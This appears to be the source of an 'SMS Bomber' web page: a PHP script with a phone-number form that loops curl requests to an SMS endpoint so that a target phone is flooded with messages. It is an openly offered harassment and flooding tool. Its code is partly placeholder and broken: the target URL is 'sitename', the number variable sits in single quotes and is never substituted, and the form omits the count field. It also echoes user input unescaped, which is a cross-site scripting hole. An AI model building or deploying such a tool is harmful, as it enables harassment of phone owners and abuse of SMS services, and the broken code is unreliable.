<head title="Nabila Tools">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>- Nabila Tools | SMS Bomber</title><link rel="shortcut icon" href="http://www.sbsseh.com/cek/nabila.jpg">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta property="og:image" content="http://www.sbsseh.com/cek/nabila.jpg"/>
<meta http-equiv="expires" content="0">
<meta http-equiv="Content-Language" content="en-us">
<link rel="shortcut icon" href="http://www.sbsseh.com/cek/nabila.jpg" type="image/x-icon" />
<meta name="distribution" content="Global">
<meta name="rating" content="General">
</head>
   <img src="https://encrypted-tbn1.gstatic.com/images?q=tbn:ANd9GcTlGnWRwN34bzgoXnxdYcUi93M2uiagJmwAeqxadWLIeS2LqHbMltFfdxRBSA" width="320px" style="border-radius: 5px 5px 5px 5px;">
   <br>
<?php
  $no=$_GET['no'];
   if( isset($_GET["no"]) ) {
      echo "Phone no :". $_GET['no']. "<br />";
      
      for ($i=1; $i <= $_GET['count'] ; $i++) { 
         $curl = curl_init();
         curl_setopt_array($curl, array(
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_URL => 'sitename?demophone=$no',
    CURLOPT_USERAGENT => 'Test request'));
    $resp = curl_exec($curl);
    curl_close($curl); 
      }
      
      exit();
   }
?>
<html>
   <body>
   
      <form action = "http://www.sbsseh.com/cek/sms/jdid.php" method = "GET">
         Phone no: <input type = "number" name = "no" />

         <input type = "submit" />
      </form>
      
   </body>
</html>